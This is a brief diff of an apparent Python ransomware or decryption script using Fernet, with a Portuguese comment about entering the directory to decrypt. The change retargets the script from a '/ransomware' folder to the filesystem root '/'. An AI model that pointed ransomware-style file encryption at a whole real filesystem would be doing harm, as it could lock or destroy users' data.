@@ -5,7 +5,7 @@ from cryptography.fernet import Fernet
 
 #ENTRANDO NO DIRETORIO PARA DESCRIPTOGRAFAR
 
-diretorio_alvo = "/ransomware"
+diretorio_alvo = "/"
 
 os.chdir(diretorio_alvo)
 
